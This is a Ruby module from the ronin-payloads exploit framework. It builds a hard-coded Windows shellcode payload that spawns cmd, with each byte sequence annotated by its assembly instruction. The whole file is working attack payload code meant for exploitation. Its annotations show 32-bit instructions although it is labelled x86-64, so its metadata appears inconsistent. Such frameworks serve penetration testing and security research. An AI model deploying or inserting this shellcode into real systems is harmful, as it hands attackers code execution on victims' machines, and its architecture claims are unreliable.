# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode_payload'

module Ronin
  module Payloads
    module Shellcode
      module Windows
        module X86_64
          #
          # Windows x86-64 shellcode that executes "cmd".
          #
          class CMD < ShellcodePayload

            register 'shellcode/windows/x86_64/cmd'

            arch :x86_64
            os :windows
            os_version '7'

            author "agix" 

            summary 'Windows x86-64 cmd shellcode'
            description <<~DESC
            Windows x86-64 shellcode that executes "cmd"
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-627.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x31\xC9".b +                 # xor ecx,ecx
                         "\x64\x8B\x71\x30".b +         # mov esi,[fs:ecx+0x30]
                         "\x8B\x76\x0C".b +             # mov esi,[esi+0xc]
                         "\x8B\x76\x1C".b +             # mov esi,[esi+0x1c]
                         "\x8B\x36".b +                 # mov esi,[esi]
                         "\x8B\x06".b +                 # mov eax,[esi]
                         "\x8B\x68\x08".b +             # mov ebp,[eax+0x8]
                         "\xEB\x20".b +                 # jmp short 0x35
                         "\x5B".b +                     # pop ebx
                         "\x53".b +                     # push ebx
                         "\x55".b +                     # push ebp
                         "\x5B".b +                     # pop ebx
                         "\x81\xEB\x11\x11\x11\x11".b + # sub ebx,0x11111111
                         "\x81\xC3\xDA\x3F\x1A\x11".b + # add ebx,0x111a3fda (for seven X86 add ebx,0x1119f7a6)
                         "\xFF\xD3".b +                 # call ebx
                         "\x81\xC3\x11\x11\x11\x11".b + # add ebx,0x11111111
                         "\x81\xEB\x8C\xCC\x18\x11".b + # sub ebx,0x1118cc8c (for seven X86 sub ebx,0x1114ccd7)
                         "\xFF\xD3".b +                 # call ebx
                         "\xE8\xDB\xFF\xFF\xFF".b +     # call dword 0x15
                         "\x63\x6d\x64".b               # db "cmd"
            end

          end
        end
      end
    end
  end
end
